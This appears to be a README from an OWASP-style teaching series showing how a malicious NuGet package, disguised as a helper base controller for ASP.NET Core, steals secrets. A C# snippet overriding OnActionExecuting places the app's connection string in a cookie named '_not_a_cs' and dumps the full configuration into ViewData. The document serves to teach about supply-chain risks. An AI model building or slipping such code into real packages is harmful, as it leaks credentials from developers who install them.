# Day 07: Avoiding the usage of vulnerable components
## Disclaimer
The usage of the Nuget package generated in this sample is under the discration of the developer which takes the following code. The authors of this repository are not responsible for the bad usage of this content.

## Content
### Custom Nuget
This project is a single nuget package that consist in a simple abstract class to help developers to improve Controllers in ASP.NET Core. 

This controller, overrides the OnActionExecuting method which is executed while an action is called in a controller. What the attacker is doing here is that recollects information from the app that is going to run this Controller, assuming that the developer is using default values of a connection string (which is the value that is going to be expose). Also, the attacker is returning the complete configuration file of the site. Finally, the attacker will expose the connection string through a cookie in the developer's site.

Snippet used for this:
``` csharp
public override void OnActionExecuting(ActionExecutingContext context)
{
    try
    {
        ViewData.Add("YOURDATA", _configuration.GetConnectionString("DefaultConnection"));
        Response.Cookies.Append("_not_a_cs", _configuration.GetConnectionString("DefaultConnection"));
        var wholeData = "";
        foreach (var item in _configuration.AsEnumerable())
        {
            wholeData += $"{item.Key},{item.Value}|";
        }
        ViewData.Add("CONFIGURATION", wholeData);
    }
    catch (System.Exception ex)
    {
        Console.WriteLine($"OWASP library :: {ex.Message}");
    }
}
```
### Site
#### Use case
A developer wants to improve Controller implementation for their Asp.Net Core apps and just finds our nuget package called "Megsoft.Owasp" and the developer install it on its site.

#### Implement the Controller
The developer will implement OwaspBaseController on a Controller and that's the package needs to gather the information. The OwaspBaseController will ask to implement a constructor to inject the IConfiguration interface into it, which can be manually implemented as:

``` csharp
public YourController(IConfiguration configuration) : base(configuration) { }
```
#### The attack in action
I you want to expose the information into a view, you can gather the values recollected using the ViewData property as follows:

``` csharp
@* Your connection string data *@
<p>@ViewData["YOURDATA"]</p>
@* Your configuration data *@
<p>@ViewData["CONFIGURATION"]</p>
```
If the attacker does not have access to the site (obviously), he/she can easily check the storage from the browser and get the cookie value _not_a_cs (which stands for "not a connection string).